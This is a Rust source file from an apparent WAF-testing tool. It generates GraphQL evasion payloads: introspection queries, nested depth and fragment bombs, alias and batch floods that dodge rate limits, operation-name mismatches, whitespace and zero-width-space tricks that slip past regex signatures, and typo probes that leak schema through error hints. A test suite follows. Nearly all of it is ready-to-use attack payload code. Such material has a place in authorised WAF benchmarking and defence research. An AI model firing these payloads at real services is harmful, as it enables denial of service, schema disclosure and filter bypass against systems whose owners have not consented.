//! GraphQL WAF-evasion payloads for wafrift.
//!
//! WAFs decode JSON and signature-match on plaintext SQL/XSS tokens,
//! but most have no GraphQL parser — a query like `{a1:user(id:1) a2:
//! user(id:2) ... a100:user(id:100){password}}` fans out to 100
//! resolver calls per HTTP request, defeating both rate limiting (1
//! HTTP req) and signature inspection (no single repeated dangerous
//! token). This crate exposes the canonical GraphQL evasion templates
//! as `Vec<String>` payloads that bench-waf, scan, and the MCTS
//! action space can consume directly.
//!
//! # Relationship to sibling Santh tools
//!
//! - **gqlprobe** (`software/gqlprobe`) is Santh's full GraphQL
//!   security scanner — 11 attack modules, async runtime, finding
//!   aggregation. wafrift uses gqlprobe's payload templates (vendored
//!   here with attribution) as bench mutator inputs. We do NOT
//!   re-implement gqlprobe's scanner; for live black-box scanning,
//!   call `gqlprobe::Scanner` directly.
//!
//! - **gossan-hidden** (`software/gossan/crates/hidden/src/graphql.rs`)
//!   has a smaller, overlapping set of 8 templates. wafrift defers to
//!   gqlprobe for breadth.
//!
//! # Vendored vs source-of-truth
//!
//! Payload constants below are vendored from gqlprobe v0.1.0. **When
//! gqlprobe ships a new attack class, port the template here too**;
//! the vendoring is intentional (avoids forcing gqlprobe to expose a
//! frozen public payload API) but the inverse-coupling means upstream
//! improvements don't reach wafrift automatically.
//!
//! # What wafrift adds on top of vendored templates
//!
//! - `op_name_mismatch_payloads()` — operation name != body op,
//!   bypasses WAFs that route by op name
//! - `introspection_whitespace_split_payloads()` — `__schema\n{...}`
//!   splits the dangerous-token boundary regex catches
//! - `alias_flood_payloads(n)` — N-way aliased identical-resolver
//!   batches (gqlprobe's batching tests fixed sizes; this is
//!   parameterised so MCTS can sweep)

#![forbid(unsafe_code)]
#![warn(missing_docs)]

use serde_json::json;

// ─────────────────────────────────────────────────────────────────────
// VENDORED from gqlprobe v0.1.0
//   software/gqlprobe/src/modules/introspection.rs
//   software/gqlprobe/src/modules/batching.rs
//   software/gqlprobe/src/modules/query_depth.rs
//   software/gqlprobe/src/modules/field_suggestion.rs
// ─────────────────────────────────────────────────────────────────────

/// Full GraphQL introspection query (from gqlprobe).
pub const INTROSPECTION_QUERY: &str = r#"
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields { name description type { name kind ofType { name kind } } }
    }
  }
}
"#;

/// Simplified introspection probe (from gqlprobe).
pub const SIMPLE_INTROSPECTION_QUERY: &str = r#"
{ __schema { queryType { name } } }
"#;

/// Single-type introspection (from gqlprobe).
pub const TYPE_INTROSPECTION_QUERY: &str = r#"
query TypeQuery($name: String!) {
  __type(name: $name) {
    name
    kind
    fields { name type { name } }
  }
}
"#;

/// Depth levels gqlprobe sweeps for DoS testing.
pub const TEST_DEPTHS: [usize; 6] = [5, 10, 20, 50, 100, 200];

/// Batch sizes gqlprobe sweeps for batching-abuse testing.
pub const TEST_BATCH_SIZES: [usize; 5] = [5, 10, 25, 50, 100];

/// Field-name typos gqlprobe uses to elicit "did you mean X?" hints
/// — these leak schema fragments through error messages.
pub const FIELD_TYPOS: &[(&str, &str)] = &[
    ("usr", "user"),
    ("passwrd", "password"),
    ("emil", "email"),
    ("admn", "admin"),
    ("usrname", "username"),
];

// ─────────────────────────────────────────────────────────────────────
// Generators — direct ports of gqlprobe's private generate_* fns.
// ─────────────────────────────────────────────────────────────────────

/// Generate a deeply nested GraphQL query string (gqlprobe port).
///
/// `depth=200` produces a query that DoSes parsers without depth
/// limits. WAFs that don't depth-limit pass it; origins without
/// `Connection: keep-alive` close, signalling abuse.
#[must_use]
pub fn generate_deep_query(depth: usize) -> String {
    let mut q = String::from("query DeepTest{user{");
    for _ in 0..depth {
        q.push_str("friends{");
    }
    q.push_str("name");
    for _ in 0..depth {
        q.push('}');
    }
    q.push_str("}}");
    q
}

/// Generate a fragment-spread depth bomb (gqlprobe port).
///
/// Distinct from `generate_deep_query` because some servers depth-
/// limit field traversal but not fragment expansion.
#[must_use]
pub fn generate_fragment_query(depth: usize) -> String {
    let mut q =
        String::from("query FragmentTest{user{...UserFields}} fragment UserFields on User{");
    for i in 0..depth {
        q.push_str(&format!("f{i}:friends{{"));
    }
    q.push_str("name");
    for _ in 0..depth {
        q.push('}');
    }
    q.push('}');
    q
}

/// Generate a JSON batch of N aliased queries (gqlprobe port).
///
/// One HTTP request fans out to N resolver invocations — bypasses
/// per-request rate limits and per-request WAF rule budgets.
#[must_use]
pub fn generate_batch(size: usize) -> Vec<serde_json::Value> {
    (0..size)
        .map(|i| json!({ "query": format!("query Batch{{user{}:user(id:{}){{name}}}}", i, i) }))
        .collect()
}

// ─────────────────────────────────────────────────────────────────────
// Wafrift-specific additions — NOT in gqlprobe today.
// ─────────────────────────────────────────────────────────────────────

/// `operationName` doesn't match the operation in `query`. Most WAFs
/// route or count by `operationName`; the actual executed operation
/// is the only one in the body, so the count is wrong and any
/// operation-name allowlist is bypassed.
#[must_use]
pub fn op_name_mismatch_payloads() -> Vec<String> {
    let cases = [
        ("BenignLookup", "{__schema{queryType{name}}}"),
        (
            "HealthCheck",
            "{__type(name:\"User\"){fields{name type{name}}}}",
        ),
        ("status", "query AdminPanel{__schema{types{name}}}"),
    ];
    cases
        .iter()
        .map(|(name, body)| json!({ "operationName": name, "query": body }).to_string())
        .collect()
}

/// Whitespace-split introspection probes. Regex rules looking for
/// `__schema{` literally are bypassed by `__schema\n{` and
/// `__schema /*comment*/ {`. The GraphQL parser ignores all
/// whitespace and comments, so the executed query is identical.
#[must_use]
pub fn introspection_whitespace_split_payloads() -> Vec<String> {
    let bodies = [
        "{__schema\n{queryType{name}}}",
        "{__schema  \t\n{queryType{name}}}",
        "{__schema #comment\n{queryType{name}}}",
        "{__schema,{queryType{name}}}", // commas are valid whitespace in GraphQL
        "{__\u{200b}schema{queryType{name}}}", // zero-width-space inside identifier
    ];
    bodies
        .iter()
        .map(|q| json!({ "query": *q }).to_string())
        .collect()
}

/// N-way aliased identical-resolver batch (single HTTP request,
/// N resolver invocations). gqlprobe tests fixed sizes (5/10/25/50/
/// 100) for DoS detection; this returns ONE arbitrary-N variant so
/// MCTS can parameter-sweep the count.
#[must_use]
pub fn alias_flood_payload(n: usize) -> String {
    let mut q = String::from("query AliasFlood{");
    for i in 0..n {
        q.push_str(&format!("a{i}:__typename "));
    }
    q.push('}');
    json!({ "query": q }).to_string()
}

/// All wafrift+vendored GraphQL evasion payloads ready for bench-waf
/// to consume as a single corpus. The strings are JSON-encoded
/// GraphQL request bodies — POST with `Content-Type: application/json`.
#[must_use]
pub fn all_evasion_payloads() -> Vec<String> {
    let mut out = Vec::new();
    // Vendored introspection variants.
    out.push(json!({ "query": INTROSPECTION_QUERY }).to_string());
    out.push(json!({ "query": SIMPLE_INTROSPECTION_QUERY }).to_string());
    out.push(
        json!({ "query": TYPE_INTROSPECTION_QUERY, "variables": { "name": "User" } }).to_string(),
    );
    // Vendored depth bombs at every test depth.
    for &d in &TEST_DEPTHS {
        out.push(json!({ "query": generate_deep_query(d) }).to_string());
        out.push(json!({ "query": generate_fragment_query(d) }).to_string());
    }
    // Vendored batch sizes.
    for &n in &TEST_BATCH_SIZES {
        out.push(serde_json::to_string(&generate_batch(n)).unwrap_or_default());
    }
    // Vendored field-suggestion typos.
    for (typo, real) in FIELD_TYPOS {
        out.push(json!({ "query": format!("{{user{{{typo}}}}}") }).to_string());
        // include the real field name in the same batch to help the
        // operator triage which schema names were leaked
        let _ = real;
    }
    // Wafrift-specific additions.
    out.extend(op_name_mismatch_payloads());
    out.extend(introspection_whitespace_split_payloads());
    for &n in &[100, 250, 500, 1000] {
        out.push(alias_flood_payload(n));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn introspection_consts_are_valid_json_bodies() {
        let body = json!({ "query": INTROSPECTION_QUERY });
        // Round-trips through serde without panicking.
        let s = body.to_string();
        let parsed: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert!(parsed.get("query").is_some());
    }

    #[test]
    fn generate_deep_query_braces_balance() {
        for d in &[1, 5, 20, 100] {
            let q = generate_deep_query(*d);
            let opens = q.matches('{').count();
            let closes = q.matches('}').count();
            assert_eq!(opens, closes, "imbalanced at depth {d}: {q}");
        }
    }

    #[test]
    fn generate_fragment_query_braces_balance() {
        for d in &[1, 5, 20] {
            let q = generate_fragment_query(*d);
            assert_eq!(
                q.matches('{').count(),
                q.matches('}').count(),
                "fragment imbalance at depth {d}"
            );
        }
    }

    #[test]
    fn generate_batch_size_matches_request_count() {
        for n in &[1, 5, 50, 100] {
            let b = generate_batch(*n);
            assert_eq!(b.len(), *n);
            for entry in &b {
                assert!(entry.get("query").is_some());
            }
        }
    }

    #[test]
    fn op_name_mismatch_payloads_have_distinct_names_and_bodies() {
        let payloads = op_name_mismatch_payloads();
        assert!(payloads.len() >= 3);
        for p in &payloads {
            let v: serde_json::Value = serde_json::from_str(p).unwrap();
            assert!(v.get("operationName").is_some());
            assert!(v.get("query").is_some());
            // operationName MUST NOT appear in the query body — that's
            // the mismatch property under test.
            let op = v["operationName"].as_str().unwrap();
            let body = v["query"].as_str().unwrap();
            assert!(
                !body.contains(op),
                "op name {op} leaked into body {body} — mismatch invariant broken"
            );
        }
    }

    #[test]
    fn whitespace_split_payloads_still_contain_schema_keyword() {
        let payloads = introspection_whitespace_split_payloads();
        for p in &payloads {
            // The whole point is to be parser-equivalent to `__schema`,
            // so the substring (possibly with embedded whitespace or
            // zero-width chars) should be present somewhere.
            assert!(p.contains("__"), "whitespace variant lost __ prefix: {p}");
            assert!(
                p.contains("schema"),
                "whitespace variant lost schema kw: {p}"
            );
        }
    }

    #[test]
    fn alias_flood_n_matches_n_aliases() {
        for n in &[5, 100, 1000] {
            let p = alias_flood_payload(*n);
            // Count aN: occurrences inside the query string.
            let v: serde_json::Value = serde_json::from_str(&p).unwrap();
            let q = v["query"].as_str().unwrap();
            // First and last alias should both be present.
            assert!(q.contains("a0:"));
            assert!(q.contains(&format!("a{}:", n - 1)));
        }
    }

    #[test]
    fn all_evasion_payloads_is_nonempty_and_unique() {
        let v = all_evasion_payloads();
        assert!(v.len() > 20, "evasion battery too small: {}", v.len());
        // No exact-string duplicates inside the unified battery.
        let set: std::collections::BTreeSet<&String> = v.iter().collect();
        assert_eq!(
            set.len(),
            v.len(),
            "all_evasion_payloads contains duplicates"
        );
    }

    // ── TEST_DEPTHS / TEST_BATCH_SIZES constants (anti-rig) ────────────

    /// Anti-rig: pin the canonical depth and batch sweep values so
    /// silent re-tuning (dropping depth=200 for "it's slow") breaks
    /// the build instead of silently shrinking coverage.
    #[test]
    fn test_depths_contains_extremes() {
        // Must include the low (5) and high (200) values.
        assert!(TEST_DEPTHS.contains(&5), "minimum depth probe removed");
        assert!(
            TEST_DEPTHS.contains(&200),
            "maximum depth probe removed — DoS coverage lost"
        );
        // Anti-rig: exact count. If someone adds or removes depths, this catches it.
        assert_eq!(TEST_DEPTHS.len(), 6, "TEST_DEPTHS length changed from 6");
    }

    #[test]
    fn test_batch_sizes_contains_extremes() {
        assert!(
            TEST_BATCH_SIZES.contains(&5),
            "minimum batch size probe removed"
        );
        assert!(
            TEST_BATCH_SIZES.contains(&100),
            "maximum batch size probe removed"
        );
        assert_eq!(
            TEST_BATCH_SIZES.len(),
            5,
            "TEST_BATCH_SIZES length changed from 5"
        );
    }

    // ── generate_deep_query boundaries ─────────────────────────────────

    #[test]
    fn generate_deep_query_depth_zero_is_minimal() {
        let q = generate_deep_query(0);
        // depth=0: no friend nesting, just the outer user field.
        assert_eq!(q.matches('{').count(), q.matches('}').count());
        assert!(q.contains("name"), "name field must appear even at depth 0");
        // Must not contain the nested friends pattern at all.
        assert!(!q.contains("friends"), "depth=0 must not nest into friends");
    }

    #[test]
    fn generate_deep_query_depth_one_has_exactly_one_friends() {
        let q = generate_deep_query(1);
        assert_eq!(q.matches("friends").count(), 1);
        assert_eq!(q.matches('{').count(), q.matches('}').count());
    }

    /// Boundary: depth=200 is one of our canonical test depths.
    /// The query must stay valid and balanced — WAFs that don't depth-
    /// limit pass it; this test proves we can generate it without OOM.
    #[test]
    fn generate_deep_query_depth_200_is_valid_and_balanced() {
        let q = generate_deep_query(200);
        assert_eq!(q.matches('{').count(), q.matches('}').count());
        // At depth 200 the friends chain must appear 200 times.
        assert_eq!(q.matches("friends").count(), 200);
    }

    #[test]
    fn generate_deep_query_larger_depth_produces_longer_string() {
        let q5 = generate_deep_query(5);
        let q100 = generate_deep_query(100);
        assert!(
            q100.len() > q5.len(),
            "deeper query must be longer: {} vs {}",
            q100.len(),
            q5.len()
        );
    }

    // ── generate_fragment_query boundaries ─────────────────────────────

    #[test]
    fn generate_fragment_query_depth_zero_contains_only_name_field() {
        let q = generate_fragment_query(0);
        assert_eq!(q.matches('{').count(), q.matches('}').count());
        assert!(q.contains("name"));
    }

    #[test]
    fn generate_fragment_query_depth_100_balanced() {
        let q = generate_fragment_query(100);
        assert_eq!(q.matches('{').count(), q.matches('}').count());
    }

    // ── generate_batch boundaries ───────────────────────────────────────

    #[test]
    fn generate_batch_size_zero_returns_empty_vec() {
        assert!(generate_batch(0).is_empty());
    }

    #[test]
    fn generate_batch_size_one_returns_exactly_one_entry() {
        let b = generate_batch(1);
        assert_eq!(b.len(), 1);
        assert!(b[0].get("query").is_some());
    }

    #[test]
    fn generate_batch_all_entries_have_unique_aliases() {
        let b = generate_batch(50);
        // Each entry's query must contain its own unique alias.
        for (i, entry) in b.iter().enumerate() {
            let q = entry["query"].as_str().unwrap();
            assert!(
                q.contains(&format!("user{i}:")),
                "batch entry {i} missing its alias: {q}"
            );
        }
    }

    // ── alias_flood_payload boundaries ──────────────────────────────────

    #[test]
    fn alias_flood_payload_zero_produces_empty_query_body() {
        let p = alias_flood_payload(0);
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        let q = v["query"].as_str().unwrap();
        // 0 aliases: query is just "query AliasFlood{}"
        assert!(q.ends_with('}'), "empty alias flood: {q}");
    }

    #[test]
    fn alias_flood_payload_one_has_exactly_one_alias() {
        let p = alias_flood_payload(1);
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        let q = v["query"].as_str().unwrap();
        assert!(q.contains("a0:__typename"));
        assert!(!q.contains("a1:"), "must not have alias a1 when n=1");
    }

    #[test]
    fn alias_flood_payload_is_valid_json_at_large_n() {
        let p = alias_flood_payload(5000);
        let result: serde_json::Result<serde_json::Value> = serde_json::from_str(&p);
        assert!(result.is_ok(), "5000-alias payload is not valid JSON");
    }

    // ── op_name_mismatch_payloads properties ───────────────────────────

    /// Anti-rig: every mismatch payload must NOT include the operationName
    /// string inside the query body — that's the bypass invariant.
    #[test]
    fn op_name_mismatch_every_name_absent_from_query_body() {
        for (i, p) in op_name_mismatch_payloads().iter().enumerate() {
            let v: serde_json::Value = serde_json::from_str(p).unwrap();
            let name = v["operationName"].as_str().unwrap().to_string();
            let body = v["query"].as_str().unwrap();
            assert!(
                !body.contains(&name),
                "payload {i}: operationName '{name}' leaked into query body '{body}'"
            );
        }
    }

    // ── whitespace split uniqueness ──────────────────────────────────────

    #[test]
    fn whitespace_split_payloads_are_all_distinct() {
        let payloads = introspection_whitespace_split_payloads();
        let set: std::collections::HashSet<&String> = payloads.iter().collect();
        assert_eq!(set.len(), payloads.len(), "duplicate whitespace variants");
    }

    /// Anti-rig: the zero-width-space variant (last entry) must contain
    /// the U+200B codepoint. If someone "normalizes" it away, the bypass
    /// disappears silently.
    #[test]
    fn whitespace_split_contains_zero_width_space_variant() {
        let payloads = introspection_whitespace_split_payloads();
        let has_zwsp = payloads.iter().any(|p| p.contains('\u{200B}'));
        assert!(has_zwsp, "zero-width-space whitespace variant was removed");
    }

    // ── FIELD_TYPOS ─────────────────────────────────────────────────────

    #[test]
    fn field_typos_has_password_typo() {
        assert!(
            FIELD_TYPOS.iter().any(|(typo, _real)| *typo == "passwrd"),
            "password typo removed — schema-leak coverage lost"
        );
    }

    #[test]
    fn field_typos_every_typo_differs_from_real() {
        for (typo, real) in FIELD_TYPOS {
            assert_ne!(
                *typo, *real,
                "FIELD_TYPOS has identical typo and real: {typo}"
            );
        }
    }

    // ── all_evasion_payloads composition (anti-rig) ──────────────────────

    /// Anti-rig: must contain all canonical sweep depths in the battery.
    #[test]
    fn all_evasion_payloads_covers_all_test_depths() {
        let payloads = all_evasion_payloads();
        for &d in &TEST_DEPTHS {
            let expected_fragment = "\"friends\"{".to_string();
            // The deep query at depth d must appear somewhere in the battery.
            // We can't search for the exact string, but we know depth-d has
            // exactly d occurrences of `friends` — check via generate_deep_query.
            let q = generate_deep_query(d);
            let as_json = serde_json::json!({ "query": q }).to_string();
            assert!(
                payloads.contains(&as_json),
                "depth {d} deep query missing from all_evasion_payloads"
            );
            let _ = expected_fragment;
        }
    }

    /// Anti-rig: must contain all canonical sweep batch sizes.
    #[test]
    fn all_evasion_payloads_covers_all_test_batch_sizes() {
        let payloads = all_evasion_payloads();
        for &n in &TEST_BATCH_SIZES {
            let batch_str = serde_json::to_string(&generate_batch(n)).unwrap_or_default();
            assert!(
                payloads.contains(&batch_str),
                "batch size {n} missing from all_evasion_payloads"
            );
        }
    }
}
